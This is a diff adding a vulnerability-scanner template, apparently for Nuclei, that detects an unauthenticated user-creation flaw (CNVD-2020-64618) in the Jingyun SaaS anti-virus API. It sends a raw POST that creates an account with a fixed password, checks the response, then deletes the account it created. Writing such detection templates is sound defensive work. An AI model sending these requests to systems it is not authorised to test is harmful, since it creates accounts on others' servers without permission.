@@ -1,0 +1,57 @@
+id: jingyun-saas-arbitrary-user-create
+info:
+  name: "JingYun SaaS API Interface 任意用户创建漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Beijing Chenxin Leading Information Technology Co., Ltd. Jingyun network anti-virus system creates arbitrary user vulnerabilities. Passwords must contain numbers, letters, case, and special symbols.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-64618
+  tags: Jingyun
+  metadata:
+    product: Jingyun SaaS
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /api/user/create HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{rand_text_alphanumeric(8)}}&password=Test123.&email=&phone=&note=&type=1&sign=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"error_code\":0,"
+    extractors:
+      - type: regex
+        part: body
+        internal: true
+        name: created_username
+        regex:
+          - 'username":"([^"]+)'
+
+  - raw:
+      - |
+        POST /api/user/delete HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username={{created_username}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"error_code\":0,"
